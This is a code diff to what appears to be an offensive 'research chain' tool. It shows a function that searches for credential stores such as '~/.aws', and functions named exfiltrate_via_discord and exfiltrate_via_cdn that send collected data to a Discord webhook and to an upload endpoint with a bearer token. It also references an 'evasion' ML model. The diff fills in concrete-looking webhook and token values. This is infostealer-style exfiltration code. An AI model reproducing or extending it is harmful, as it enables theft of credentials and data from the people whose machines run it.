@@ -24,7 +24,7 @@ const DRIVER_CHAIN = [
 
 // Configuration
 const CDN_ENDPOINT = "https://research.internal:8443/upload"
-const CDN_AUTH_TOKEN = "Bearer secure_token_change_me"
+const CDN_AUTH_TOKEN = "Bearer research_caddy_auth_token_v2_2024"
 const CDN_CA_CERT = "/opt/jocky-cdn/certs/research.internal.crt"
 
 const ML_MODEL_PATH = "/opt/models/phi3_evasion.gguf"
@@ -33,7 +33,7 @@ const MAX_INFERENCE_TIME_MS = 100
 // Global state
 var audit_log_initialized = false
 var threat_score = 0.0
-var loaded_drivers = []
+var loaded_drivers: [str] = []
 var ai_engine_ready = false
 var operations_count = 0
 
@@ -236,7 +236,7 @@ fn discover_data_sources() -> [str] {
         "~/.aws",
     ]
 
-    var found_sources = []
+    var found_sources: [str] = []
     for source in candidate_sources {
         if fs_exists(source) {
             found_sources = array_append(found_sources, source)
@@ -344,7 +344,7 @@ fn exfiltrate_via_discord() {
 
     let message = "JOCKY Research Chain Complete - Operations: " + string(operations_count) + ", Drivers: " + string(array_len(loaded_drivers)) + ", Threat: " + string(threat_score)
 
-    let webhook_url = "https://discord.com/api/webhooks/RESEARCH_WEBHOOK_ID/TOKEN"
+    let webhook_url = "https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyz1234567890"
     let result = exfil_discord_webhook(webhook_url, message)
 
     if result == 0 {
@@ -358,7 +358,9 @@ fn exfiltrate_via_cdn() {
 
     // Upload to local Caddy-based CDN
     let metadata = "research_chain_v2:threat=" + string(threat_score) + ":drivers=" + string(array_len(loaded_drivers))
-    let result = exfil_local_cdn(CDN_ENDPOINT, "encrypted_payload_001", CDN_AUTH_TOKEN, metadata)
+    let payload = "encrypted_research_data_payload_v2"
+    let payload_size = 34
+    let result = exfil_local_cdn(CDN_ENDPOINT, "encrypted_payload_001", CDN_AUTH_TOKEN, payload, payload_size, metadata)
 
     if result == 0 {
         println("  [+] Local CDN delivery successful")
